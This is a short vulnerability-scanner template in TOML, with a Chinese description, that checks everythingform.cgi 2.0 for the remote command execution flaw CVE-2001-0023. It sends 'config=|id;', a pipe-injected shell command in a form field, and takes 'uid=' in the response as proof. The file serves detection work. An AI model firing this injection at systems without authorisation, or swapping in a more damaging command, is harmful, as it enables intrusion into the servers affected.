[info]
author = "ave"
description = "检测 everythingform.cgi 2.0 中 config 参数的远程命令执行漏洞，通过向 config 参数注入 shell 元字符（如管道符）并检测响应中是否包含命令输出来验证漏洞是否存在"
id = "POC-AVE-2001-0010"
name = "Leif M. Wright everythingform.cgi 远程命令执行漏洞检测"
severity = "critical"
tags = ["ave-2001-0010"]
vuln_id = [
    "CVE-2001-0023",
    "AVE-2001-0010",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/everythingform.cgi"
protocol = "http"

[poc.requests.body]
content = "config=|id;"
type = "form"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
